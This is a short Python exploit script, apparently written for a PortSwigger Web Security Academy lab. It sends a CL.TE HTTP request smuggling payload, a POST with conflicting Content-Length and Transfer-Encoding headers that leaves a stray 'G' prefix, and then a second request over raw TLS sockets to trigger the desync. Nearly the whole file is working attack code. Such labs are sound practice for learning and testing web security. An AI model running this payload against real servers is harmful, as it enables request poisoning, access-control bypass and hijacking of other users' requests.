import socket
import ssl

host = '0a59008303ae15f3e1c9bb7000ed00d1.web-security-academy.net'
port = 443

# Smuggling payload (CL.TE)
payload1 = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Connection: keep-alive\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 6\r\n" #6 = line16-18
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "G"
)

payload2 = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 9\r\n" #9 = line27
    "\r\n"
    "rat=rat\r\n" 
    "\r\n"
)

def send_raw_https(host, port, raw_payload):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.sendall(raw_payload.encode())
            response = ssock.recv(4096)
            print(response.decode(errors="ignore"))

print("[+] Sending payload 1...")
send_raw_https(host, port, payload1)
print("[+] Sending payload 2...")
send_raw_https(host, port, payload2)